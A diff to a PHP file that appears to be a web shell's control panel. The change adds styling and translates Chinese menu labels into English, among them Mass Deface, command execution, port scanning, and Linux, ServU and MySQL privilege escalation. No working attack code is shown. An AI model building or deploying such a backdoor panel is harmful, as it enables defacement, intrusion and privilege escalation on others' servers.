+				text-decoration:none;
+			}
+			a:hover{
+				background:#BBBBBB;
+			}
+			.outtable {
+				margin: 0 auto;
+				height:595px;
+				width:955px;
+				color:#000000;
+				border-top-width: 2px;
+				border-right-width: 2px;
+				border-bottom-width: 2px;
+				border-left-width: 2px;
+				border-top-style: outset;
+				border-right-style: outset;
+				border-bottom-style: outset;
+				border-left-style: outset;
+				border-top-color: #FFFFFF;
+				border-right-color: #8c8c8c;
+				border-bottom-color: #8c8c8c;
+				border-left-color: #FFFFFF;
+				background-color: threedface;
+			}
+			.topbg {
+				padding-top:3px;
+				text-align: left;
+				font-size:12px;
+				font-weight: bold;
+				height:22px;
+				width:950px;
+				color:#FFFFFF;
+				background: #293F5F;
+			}
+			.bottombg {
+				padding-top:3px;
+				text-align: center;
+				font-size:12px;
+				font-weight: bold;
+				height:22px;
+				width:950px;
+				color:#000000;
+				background: #888888;
+			}
 			.listbg {font-family:'lucida grande',tahoma,helvetica,arial,'bitstream vera sans',sans-serif;font-size:13px;width:130px;}
 			.listbg li{padding:3px;color:#000000;height:25px;display:block;line-height:26px;text-indent:0px;}
 			.listbg li a{padding-top:2px;background:#BBBBBB;color:#000000;height:25px;display:block;line-height:24px;text-indent:0px;border-color:#999999 #999999 #999999 #999999;border-style:solid;border-width:1px;text-decoration:none;}
@@ -1861,28 +1914,32 @@ print<<<END
 	</head>
 	<body>
 		<div class="outtable">
-		<div class="topbg"> &nbsp; {$Server_IP} - {$Server_OS} - <a href="{$Server_Alexa}" target="_blank">Alexa</a></div>
+		<div class="topbg"> &nbsp; <?= $Server_IP ?> - <?= $Server_OS ?> - <a href="{$Server_Alexa}" target="_blank">Alexa</a></div>
 			<div style="height:546px;">
 				<table width="100%" height="100%" border=0 cellpadding="0" cellspacing="0">
 				<tr>
 				<td width="140" align="center" valign="top">
 					<ul class="listbg">
-						<li><a href="?s=a" id="t_0" onclick="switchTab('t_0')" style="background:#FFFFFF;" target="main"> 文件管理 </a></li>
-						<li><a href="?s=b" id="t_1" onclick="switchTab('t_1')" target="main"> 批量挂马 </a></li>
-						<li><a href="?s=c" id="t_2" onclick="switchTab('t_2')" target="main"> 批量清马 </a></li>
-						<li><a href="?s=d" id="t_3" onclick="switchTab('t_3')" target="main"> 批量替换 </a></li>
-						<li><a href="?s=e" id="t_4" onclick="switchTab('t_4')" target="main"> 扫描木马 </a></li>
-						<li><a href="?s=f" id="t_5" onclick="switchTab('t_5')" target="main"> 系统信息 </a></li>
-						<li><a href="?s=g" id="t_6" onclick="switchTab('t_6')" target="main"> 执行命令 </a></li>
-						<li><a href="?s=h" id="t_7" onclick="switchTab('t_7')" target="main"> 组件接口 </a></li>
-						<li><a href="?s=i" id="t_8" onclick="switchTab('t_8')" target="main"> 扫描端口 </a></li>
-						<li><a href="?s=j" id="t_9" onclick="switchTab('t_9')" target="main"> 搜索文件 </a></li>
-						<li><a href="?s=k" id="t_10" onclick="switchTab('t_10')" target="main"> Linux提权 </a></li>
-						<li><a href="?s=l" id="t_11" onclick="switchTab('t_11')" target="main"> ServU提权 </a></li>
-						<li><a href="?s=m" id="t_12" onclick="switchTab('t_12')" target="main"> MYSQL提权 </a></li>
-						<li><a href="?s=n" id="t_13" onclick="switchTab('t_13')" target="main"> MYSQL执行 </a></li>
-						<li><a href="?s=o" id="t_14" onclick="switchTab('t_14')" target="main"> MYSQL管理 </a></li>
-						<li><a href="?s=logout" id="t_15" onclick="switchTab('t_15')"> 退出系统 </a></li>
+						<li>
+							<a href="?s=a" id="t_0" onclick="switchTab('t_0')" style="background:#FFFFFF;" target="main">
+								Filenamager
+							</a>
+						</li>
+						<li><a href="?s=b" id="t_1" onclick="switchTab('t_1')" target="main"> Mass Deface </a></li>
+						<li><a href="?s=c" id="t_2" onclick="switchTab('t_2')" target="main"> Batch cleaning </a></li>
+						<li><a href="?s=d" id="t_3" onclick="switchTab('t_3')" target="main"> Batch replacement </a></li>
+						<li><a href="?s=e" id="t_4" onclick="switchTab('t_4')" target="main"> Scan Trojan </a></li>
+						<li><a href="?s=f" id="t_5" onclick="switchTab('t_5')" target="main"> system message </a></li>
+						<li><a href="?s=g" id="t_6" onclick="switchTab('t_6')" target="main"> Excuting an order </a></li>
+						<li><a href="?s=h" id="t_7" onclick="switchTab('t_7')" target="main"> Component interface </a></li>
+						<li><a href="?s=i" id="t_8" onclick="switchTab('t_8')" target="main"> Scan port </a></li>
+						<li><a href="?s=j" id="t_9" onclick="switchTab('t_9')" target="main"> Search file </a></li>
+						<li><a href="?s=k" id="t_10" onclick="switchTab('t_10')" target="main"> Linux rights escalation </a></li>
+						<li><a href="?s=l" id="t_11" onclick="switchTab('t_11')" target="main"> ServU escalation </a></li>
+						<li><a href="?s=m" id="t_12" onclick="switchTab('t_12')" target="main"> MYSQL escalation </a></li>
+						<li><a href="?s=n" id="t_13" onclick="switchTab('t_13')" target="main"> MYSQL execution </a></li>
+						<li><a href="?s=o" id="t_14" onclick="switchTab('t_14')" target="main"> MYSQL management </a></li>
+						<li><a href="?s=logout" id="t_15" onclick="switchTab('t_15')"> Logout </a></li>
 					</ul>
 				</td>
 				<td>
@@ -1891,11 +1948,11 @@ print<<<END
 				</tr>
 				</table>
 			</div>
-		<div class="bottombg"> {$Server_Soft} </div>
+		<div class="bottombg"> <?=$Server_Soft?> </div>
 		</div>
 	</body>
 </html>
-END;
+<?php
 return false;
 }
 
